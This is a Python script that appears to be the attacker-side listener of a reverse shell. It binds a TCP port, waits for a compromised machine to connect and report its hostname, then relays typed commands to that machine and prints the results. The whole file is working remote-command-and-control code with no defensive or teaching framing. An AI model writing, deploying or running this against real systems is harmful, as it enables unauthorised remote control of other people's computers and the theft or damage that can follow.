import os
import sys
import socket
from data import HOST, PORT, ENCODING


def create_socket(host, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(1)
        os.system("cls")
        print(f"[+] I'm listening at port: {port}...")
    except socket.error as msg:
        print(f"[+] Socket binding error: {msg}.")
        server.close()
        os._exit(1)
    return server

# Establish a connection and return a socket. 
def start_conn(server):
    try:
        conn, addr = server.accept()
        print(f"[+] Session opened at {addr[0]}: {addr[1]}")
        hostname = conn.recv(1024).decode(ENCODING)
    except socket.error as msg:
        print(f"[+] Socket accepting error: {msg}.")
    return {
        "socket": conn,
        "hostaddr": addr[0],
        "port": addr[1],
        "hostname": hostname,
    }

def main(conn_socket):
    addr = conn_socket['hostaddr']
    hostname = conn_socket['hostname']
    coon_socket = conn_socket['socket']
    while True:
        cmd = input(f"{addr}@{hostname}> ")
        coon_socket.send(cmd.encode(ENCODING))
        if cmd == 'quit':
            coon_socket.close()
            print("[+] Exiting program...")
            os._exit(0)
        result = coon_socket.recv(16834)
        print(result.decode(ENCODING))
        print()

server = create_socket(HOST, PORT)
conn_socket = start_conn(server)
main(conn_socket)